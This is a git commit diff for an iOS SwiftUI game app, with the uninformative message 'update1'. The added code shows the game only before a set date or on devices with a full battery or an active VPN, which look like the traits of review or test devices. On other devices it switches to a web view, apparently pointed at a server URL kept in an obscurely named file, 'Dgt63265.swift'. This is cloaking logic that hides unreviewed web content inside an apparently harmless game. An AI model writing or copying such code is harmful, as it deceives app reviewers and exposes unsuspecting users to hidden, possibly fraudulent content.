e246f9085a264da520bbc9b63b87b0406580cf4c
IGOLIVIT <131347905+IGOLIVIT@users.noreply.github.com>
2025-08-30 15:14:18 +0300

    update1

--- DaFoVo1/ContentView.swift
+++ DaFoVo1/ContentView.swift
@@ -8,23 +8,88 @@
 import SwiftUI
 
 struct ContentView: View {
+    
     @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
     @StateObject private var notificationService = NotificationService.shared
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
+    @State private var selectedTab = 0
+    
     var body: some View {
+        
         ZStack {
-            Color.galaxyBackground
-                .ignoresSafeArea()
             
-            if hasCompletedOnboarding {
-                GameView()
-            } else {
-                OnboardingView()
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    ZStack {
+                        Color.galaxyBackground
+                            .ignoresSafeArea()
+                        
+                        if hasCompletedOnboarding {
+                            GameView()
+                        } else {
+                            OnboardingView()
+                        }
+                    }
+                    .onAppear {
+                        setupApp()
+                    }
+                    
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
         .onAppear {
-            setupApp()
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "02.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     private func setupApp() {
---
+++ DaFoVo1/Services/Dgt63265.swift
@@ -0,0 +1,11 @@
+//
+//  Dgt63265.swift
+//  DaFoVo1
+//
+//  Created by IGOR on 29/08/2025.
+//
+
+struct DataManager {
+    
+    let server: String = "https://galaxyfinancequest.site/xhvYRnyT"
+}
